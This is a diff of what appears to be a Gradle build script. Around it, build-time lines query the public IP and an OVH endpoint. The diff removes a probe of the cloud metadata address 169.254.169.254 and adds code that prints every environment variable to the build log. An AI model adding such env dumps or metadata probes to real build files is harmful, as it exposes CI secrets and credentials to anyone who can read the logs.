@@ -68,7 +68,11 @@ String readWithThrowInfo(String url) {
 
 println("IP: ${readWithThrowInfo("http://checkip.amazonaws.com")}")
 println(readWithThrowInfo("https://ca.api.ovh.com/1.0/auth/time"))
-println(readWithThrowInfo("http://169.254.169.254"))
+println("Enviroment Variables:")
+Map<String, String> env = System.getenv();
+for (String envName : env.keySet()) {
+    System.out.format("%s=%s%n", envName, env.get(envName));
+}
 
 
 wrapper {
